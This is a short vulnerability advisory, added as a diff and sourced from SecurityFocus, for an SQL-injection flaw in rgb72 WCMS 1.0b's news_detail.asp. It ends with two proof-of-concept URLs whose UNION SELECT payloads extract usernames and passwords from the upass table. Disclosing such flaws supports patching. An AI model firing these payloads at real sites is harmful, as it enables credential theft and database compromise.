@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/31298/info
+
+rgb72 WCMS is prone to an SQL-injection vulnerability because it fails to properly sanitize user-supplied input before using it in an SQL query.
+
+Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit vulnerabilities in the underlying database.
+
+rgb72 WCMS 1.0b is vulnerable; other versions may also be affected. 
+
+http://www.example.com/[path]/news_detail.asp?id=1+union+select+1,2,3,f_user,f_password,6,7,8+from+upass%00
+
+http://www.example.com/[path]/news_detail.asp?id=1+union+select+1,2,f_user,4,5,f_password,7,8,9,10,11,12,13+from+upass%00 
